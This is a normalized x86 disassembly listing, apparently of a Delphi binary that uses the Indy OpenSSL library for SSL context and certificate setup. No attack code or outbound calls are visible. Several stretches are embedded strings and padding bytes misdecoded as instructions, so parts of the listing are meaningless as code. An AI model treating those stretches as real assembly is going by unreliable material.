add [ eax ] al
add ah bl
hlt
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc edx
imul ebp [ esi + 0x64 ] 0x45676e69
jb r-xdata
inc ebp
jb r-xdata
imul ebp [ esi + 0x67 ] 0x74726543
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
add bl dh
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 8 + 0x45 ] al
cmc
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add bl dh
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
cmc
inc ebp
add [ eax + eax ] cl
outsd
jb r-xdata
push j_sub_403834#9
push [ fs : eax ]
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc0045f7 ]
outsd
jb r-xdata
jns r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 8 + 0x45 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
test [ ebp ] 0xc
add [ eax ] al
add [ eax ] al
inc ebp
test [ ebp ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] al
call 0x1b463575
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
cmc
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi [ ebx + 0x34 ]
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4248f8
xor eax eax
push ebp
push sub_45f876
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_403eb4
mov ebx [ ebp + 0x14 ]
mov esi [ ebx + 0x34 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
cwde
clc
inc ebp
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
jb r-xdata
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x12463771
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ecx
test [ ebp ] 0x0
add [ eax ] al
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x194636a5
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
push ebx
je r-xdata
jb r-xdata
inc eax
imul ebp [ esi + 0x67 ] 0x68706943
jb r-xdata
mov eax [ ebp - 0x8 ]
call sub_404174
mov ebx eax
lea eax [ ebp - 0xc ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_4041c0
mov eax [ ebp - 0xc ]
call sub_404374
mov edx eax
lea ecx [ ebx + 0x1 ]
mov eax [ ebp + 0x8 ]
call sub_408434
mov [ ebp - 0x4 ] ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f87d
mov eax [ rw-data ]
call sub_424900
retn
inc esp
popad
je r-xdata
add [ eax ] al
add [ edx + esi * 8 + 0x33280045 ] ah
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x134637d1
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x72 ] si
jb r-xdata
mov al [ 0x45f7 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0045f7 ] ah
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
or bh bh
push ecx
mov esi [ fs : ebx + 0x34 ]
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
xor eax eax
push ebp
xor [ eax ] al
call 0x1746370d
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
add [ eax - 0x53ffbfd0 ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
test [ ebp ] 0xc
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
outsd
jb r-xdata
popad
imul ebp [ fs : esi + 0x67 ] 0x4579654b
rcr ah 0xf6
inc ebp
add [ eax ] al
add [ eax ] al
sub_45f8ab
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push j_sub_403834#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4248f8
xor eax eax
push ebp
push sub_45f983
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45e6dc
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
lea edx [ ebp - 0x10 ]
call sub_4085bc
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4059b4
mov eax [ ebp - 0x14 ]
xor ecx ecx
pop edx
call sub_408aac
mov esi [ ebx + 0xc ]
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov esi [ ebx + 0xc ]
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f98a
mov eax [ rw-data ]
call sub_424900
retn
mov eax esi
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
sub_45f9bc
push ebx
call sub_45d524
test al al
jne r-xdata
call sub_45e6ec
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
setg bl
mov dl 0x1
mov eax [ r-xdata ]
call sub_424870
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424870
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424870
mov [ rw-data ] eax
xor ebx ebx
jmp r-xdata
mov eax ebx
pop ebx
retn
sub_45fa44
push ecx
mov [ esp ] al
xor eax eax
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x2
je r-xdata
or eax 0x1
test [ esp ] 0x4
je r-xdata
or eax 0x2
pop edx
retn
or eax 0x4
sub_45fa68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov eax [ rw-data ]
call sub_4248f8
xor eax eax
push ebp
push j_sub_403834#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_403580
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov edi eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov ebx eax
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_460e84
mov edi eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403918
jmp r-xdata
mov eax ebx
call sub_45e6dc
mov ebx eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov esi eax
mov eax [ ebx + 0xc ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax [ ebx + 0xc ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ ebp - 0x5 ] al
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
mov eax [ ebx + 0xc ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov [ ebp - 0x5 ] al
xor eax eax
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0x10 ]
cmp esi [ eax + 0x14 ]
jle r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_424900
retn
sub_45fb70
call sub_4038e8
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_424900
retn
sub_45fbb8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414110
mov edi esi
lea eax [ edi + 0x4 ]
mov edx [ ebx + 0x4 ]
call sub_403f08
lea eax [ edi + 0x8 ]
mov edx [ ebx + 0x8 ]
call sub_403f08
lea eax [ edi + 0xc ]
mov edx [ ebx + 0xc ]
call sub_403f08
mov al [ ebx + 0x10 ]
mov [ edi + 0x10 ] al
mov al [ ebx + 0x11 ]
mov [ edi + 0x11 ] al
mov al [ ebx + 0x18 ]
mov [ edi + 0x18 ] al
mov eax [ ebx + 0x14 ]
mov [ edi + 0x14 ] eax
lea eax [ edi + 0x1c ]
mov edx [ ebx + 0x1c ]
call sub_403f08
lea eax [ edi + 0x20 ]
mov edx [ ebx + 0x20 ]
call sub_403f08
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45fc30
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45b110
mov [ esi + 0x70 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ esi + 0x6c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_45fc78
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
cmp [ esi + 0x68 ] 0x0
je r-xdata
mov eax [ esi + 0x6c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45b1a8
test bl bl
jle r-xdata
lea eax [ esi + 0x68 ]
call sub_40cc80
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_45fcb8
push ebx
push esi
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46024c
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x34 ] ebx
lea eax [ esi + 0x8 ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0x4 ]
call sub_403f08
lea eax [ esi + 0xc ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0x8 ]
call sub_403f08
lea eax [ esi + 0x10 ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0xc ]
call sub_403f08
mov eax [ ebx + 0x6c ]
mov eax [ eax + 0x14 ]
mov [ esi + 0x14 ] eax
mov eax [ ebx + 0x6c ]
mov al [ eax + 0x18 ]
mov [ esi + 0x18 ] al
lea eax [ esi + 0x1c ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0x1c ]
call sub_403f08
lea eax [ esi + 0x20 ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0x20 ]
call sub_403f08
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov [ esi + 0x29 ] 0x0
mov [ esi + 0x29 ] 0x1
jmp r-xdata
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x28 ] 0x1
jmp r-xdata
cmp [ ebx + 0x7a ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
mov al [ eax + 0x10 ]
mov [ esi + 0x4 ] al
mov eax [ ebx + 0x6c ]
mov al [ eax + 0x11 ]
mov [ esi + 0x5 ] al
mov dl 0x1
mov eax [ ebx + 0x68 ]
call sub_46034c
mov [ ebx + 0x70 ] 0x1
pop esi
pop ebx
retn
sub_45fd70
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fe8c
mov [ esp ] eax
mov eax [ esp ]
mov [ eax + 0x84 ] 0x1
mov eax [ esp ]
mov edx [ eax ]
call [ edx + 0x4c ]
mov eax [ esp ]
mov eax [ eax + 0x68 ]
mov edx esi
call sub_45c6dc
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor ebx ebx
mov eax esp
call sub_40cc80
mov eax [ esp ]
mov edx [ ebx + 0x6c ]
mov [ eax + 0x7c ] edx
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4608ec
mov edx [ esp ]
mov [ edx + 0x80 ] eax
mov eax [ esp ]
mov edx [ ebx + 0x68 ]
mov [ eax + 0x78 ] edx
mov ebx [ esp ]
jmp r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
sub_45fdf8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404364
xor eax eax
push ebp
push sub_45fe3e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x7a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fe45
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_45fe8c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45d0c0
mov [ esi + 0x84 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ esi + 0x7c ] eax
mov [ esi + 0xa0 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_45fee0
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
lea eax [ esi + 0x80 ]
call sub_40cc80
cmp [ esi + 0x84 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45d2c8
test bl bl
jle r-xdata
lea eax [ esi + 0x78 ]
call sub_40cc80
mov eax [ esi + 0x7c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_45ff2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45cec8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
xor eax eax
push ebp
push j_sub_4036ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46009c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
sub_45ff82
add [ eax ] eax
add [ eax ] al
pushad
inc ebp
add [ esi - 0x74ffba01 ] cl
inc ebp
cld
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
call sub_4038e8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
call sub_403894
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
sub_460038
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403580#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45b554
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x78 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
call sub_4609d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46009c
push ebx
push esi
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46024c
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0x34 ] ebx
lea eax [ esi + 0x8 ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0x4 ]
call sub_403f08
lea eax [ esi + 0xc ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0x8 ]
call sub_403f08
lea eax [ esi + 0x10 ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0xc ]
call sub_403f08
mov eax [ ebx + 0x7c ]
mov eax [ eax + 0x14 ]
mov [ esi + 0x14 ] eax
mov eax [ ebx + 0x7c ]
mov al [ eax + 0x18 ]
mov [ esi + 0x18 ] al
lea eax [ esi + 0x1c ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0x1c ]
call sub_403f08
lea eax [ esi + 0x20 ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0x20 ]
call sub_403f08
cmp [ ebx + 0x9a ] 0x0
je r-xdata
mov [ esi + 0x29 ] 0x0
mov [ esi + 0x29 ] 0x1
jmp r-xdata
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x28 ] 0x1
jmp r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax [ ebx + 0x7c ]
mov al [ eax + 0x10 ]
mov [ esi + 0x4 ] al
mov eax [ ebx + 0x7c ]
mov al [ eax + 0x11 ]
mov [ esi + 0x5 ] al
xor edx edx
mov eax [ ebx + 0x78 ]
call sub_46034c
pop esi
pop ebx
retn
sub_460154
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404364
xor eax eax
push ebp
push sub_4601a3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4601aa
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_4601f0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4608ec
mov esi eax
mov [ ebx + 0x80 ] esi
mov eax [ ebx + 0x78 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x68 ]
mov edx [ eax + 0xc ]
mov ecx [ ebx + 0x78 ]
mov eax esi
call sub_460bd0
sub_46024c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4602dc
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4030c8
cmp [ rw-data ] 0x0
jg r-xdata
add esp 0xfffffff0
call sub_403404
inc [ rw-data ]
mov al [ r-xdata ]
mov [ esi + 0x18 ] al
mov [ esi + 0x5 ] 0x0
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4602e3
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
call sub_45f9bc
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
sub_460301
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_40346c
mov ebx edx
mov esi eax
mov eax esi
call sub_460330
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_460330
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
xor eax eax
mov [ ebx + 0x24 ] eax
sub_46034c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov edi eax
xor eax eax
push ebp
push j_sub_403834#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_460330
cmp [ edi + 0x5 ] 0x0
jne r-xdata
mov eax edi
call sub_460648
mov esi eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov ebx eax
mov [ edi + 0x24 ] ebx
test ebx ebx
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
push r-xdata
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
push edi
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
cmp [ edi + 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov [ edi + 0x5 ] 0x1
mov [ edi + 0x5 ] 0x2
jmp r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
mov eax edi
call sub_460820
test al al
jne r-xdata
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax edi
call sub_46085c
test al al
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
cmp [ edi + 0x28 ] 0x0
je r-xdata
mov eax edi
call sub_460898
test al al
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
cmp [ edi + 0x20 ] 0x0
je r-xdata
push r-xdata
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
push r-xdata
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov esi eax
mov eax [ edi + 0x20 ]
call sub_404374
call sub_4085f0
mov ebx eax
push ebx
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov esi eax
mov eax ebx
call sub_40861c
jmp r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x18 ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
test esi esi
jg r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov cl [ edi + 0x29 ]
mov dl [ edi + 0x18 ]
mov eax edi
call sub_4605e4
cmp [ edi + 0x8 ] 0x0
je r-xdata
push 0x4
lea eax [ edi + 0x2c ]
push eax
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4605a7
lea eax [ ebp - 0x18 ]
mov edx 0x5
call sub_403ed8
retn
mov eax [ edi + 0x8 ]
call sub_404374
call sub_4085f0
mov ebx eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax ebx
call sub_40861c
sub_4605e4
push ebx
push esi
push ecx
mov [ esp ] dl
mov ebx eax
mov esi [ ebx + 0x24 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
test cl cl
je r-xdata
push 0x0
mov al [ esp + 0x4 ]
call sub_45fa44
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
push sub_45fa68
mov al [ esp + 0x4 ]
call sub_45fa44
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
jmp r-xdata
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
sub_460648
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor edx edx
push ebp
push sub_460812
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x5 ] 0x0
jne r-xdata
mov dl [ eax + 0x4 ]
sub dl 0x1
jb r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov al [ eax + 0x5 ]
dec al
je r-xdata
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov al [ eax + 0x5 ]
dec al
je r-xdata
dec dl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460819
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov al [ eax + 0x5 ]
dec al
je r-xdata
dec dl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
